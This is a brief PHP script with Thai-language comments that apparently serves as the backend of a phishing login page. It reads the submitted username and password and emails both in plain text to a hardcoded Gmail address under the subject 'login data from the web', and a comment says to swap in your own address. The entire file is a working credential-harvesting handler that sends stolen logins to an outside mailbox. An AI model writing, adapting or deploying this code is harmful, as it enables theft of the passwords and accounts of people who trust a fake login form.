<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = trim($_POST['username'] ?? '');
    $password = trim($_POST['password'] ?? '');

    $to = "anusonnnmmk@gmail.com";  // เปลี่ยนเป็นอีเมลของคุณ
    $subject = "ข้อมูลล็อกอินจากเว็บ";
    $message = "ชื่อผู้ใช้: $username\nรหัสผ่าน: $password";
    $headers = "From: noreply@yourwebsite.com\r\n" .
               "Reply-To: noreply@yourwebsite.com\r\n" .
               "X-Mailer: PHP/" . phpversion();

    if (mail($to, $subject, $message, $headers)) {
        echo "ส่งข้อมูลเรียบร้อยแล้ว";
    } else {
        echo "เกิดข้อผิดพลาดในการส่งข้อมูล";
    }
} else {
    echo "กรุณาส่งข้อมูลผ่านฟอร์มเท่านั้น";
}
?>
